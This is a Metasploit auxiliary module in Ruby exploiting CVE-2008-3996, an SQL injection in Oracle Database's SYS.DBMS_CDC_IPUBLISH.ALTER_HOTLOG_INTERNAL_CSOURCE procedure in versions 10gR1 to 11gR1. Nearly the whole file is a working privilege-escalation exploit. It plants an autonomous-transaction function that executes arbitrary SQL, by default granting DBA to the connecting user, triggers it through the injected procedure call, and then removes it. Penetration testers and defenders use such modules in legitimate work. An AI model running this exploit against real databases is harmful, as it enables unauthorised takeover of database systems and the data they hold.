##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE',
        'Description' => %q{
          The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE
          procedure of the PL/SQL package DBMS_CDC_IPUBLISH. Any user with execute privilege
          on the vulnerable package can exploit this vulnerability. By default, users granted
          EXECUTE_CATALOG_ROLE have the required privilege.  Affected versions: Oracle Database
          Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.
        },
        'Author' => [ 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-3996' ],
          [ 'OSVDB', '49321']
        ],
        'DisclosureDate' => '2008-10-22',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
      ]
    )
  end

  def run
    return if !check_dependencies

    name = Rex::Text.rand_text_alpha_upper(1..10)

    function = "
      CREATE OR REPLACE FUNCTION #{name}
      RETURN VARCHAR2 AUTHID CURRENT_USER
      IS
      PRAGMA AUTONOMOUS_TRANSACTION;
      BEGIN
      EXECUTE IMMEDIATE '#{datastore['SQL']}';
      COMMIT;
      RETURN NULL;
      END;"

    package = "
      BEGIN
      SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE('''||'||user||'.#{name}||''');END;"

    clean = "DROP FUNCTION #{name}"

    begin
      print_status('Sending function...')
      prepare_exec(function)
    rescue StandardError
      return
    end

    print_status('Attempting sql injection on SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE...')
    prepare_exec(package)

    print_status("Done! Removing function '#{name}'...")
    prepare_exec(clean)
  end
end
